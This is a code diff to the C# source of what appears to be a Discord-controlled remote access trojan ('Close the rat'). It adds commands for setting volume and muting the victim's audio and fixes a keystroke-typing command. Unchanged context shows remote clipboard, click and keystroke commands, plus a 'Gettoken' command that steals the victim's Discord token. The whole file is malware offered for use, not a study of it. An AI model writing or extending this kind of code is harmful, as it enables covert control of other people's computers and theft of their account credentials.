@@ -7,7 +7,6 @@ using System.Threading.Tasks;
 using DSharpPlus.Interactivity.Extensions;
 using System.Threading;
 using DSharpPlus.Entities;
-using Discord_Main.Properties;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Net.Http;
@@ -23,13 +22,8 @@ using Org.BouncyCastle.Crypto.Parameters;
 using System.Net;
 using System.Net.Sockets;
 using System.Windows.Forms;
-using System.Runtime.InteropServices.ComTypes;
-using System.Security.Policy;
-using LumiSoft.Net.AUTH;
 using Salaros.Configuration;
-using System.CodeDom;
-using System.Runtime.InteropServices;
-
+using AudioSwitcher.AudioApi.CoreAudio;
 
 namespace Discord_Main
 {
@@ -79,6 +73,9 @@ namespace Discord_Main
                 "!Set_Clipboard(Text) Set clipboard.\n" +
                 "!Click click\n" +
                 "!Write(Text) write words.\n" +
+                "!Volume(number) Set volume.\n" +
+                "!Mute Muted device.\n" +
+                "!Unmute Unmute device.\n" +
                 "!Exit = Close the rat.\n" +
                 "```"
                 );
@@ -419,12 +416,44 @@ namespace Discord_Main
         }
 
         [Command("Write"), Description("Write words.")]
-        public async Task Click(CommandContext ctx, string text)
+        public async Task Write(CommandContext ctx, string text)
         {
             if (channelcheck(ctx.Channel.Id.ToString()) == false)
                 return;
             SendKeys.SendWait(text);
             ctx.Channel.SendMessageAsync("Typed keys.");
+        }
+
+        [Command("Volume"), Description("Set volume.")]
+        public async Task Volume(CommandContext ctx, int volume)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+
+            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
+            defaultPlaybackDevice.Volume = volume;
+            ctx.Channel.SendMessageAsync("Set volume.");
+        }
+
+        [Command("Mute"), Description("Mute Device.")]
+        public async Task Mute(CommandContext ctx)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+
+            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
+            defaultPlaybackDevice.Mute(true);
+            ctx.Channel.SendMessageAsync("Muted");
+        }
+        [Command("Unmute"), Description("Unmute Device.")]
+        public async Task Unmute(CommandContext ctx)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+
+            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
+            defaultPlaybackDevice.Mute(false);    
+            ctx.Channel.SendMessageAsync("Unmuted.");
         }
 
         [Command("Gettoken"), Description("Gets discord token.")]
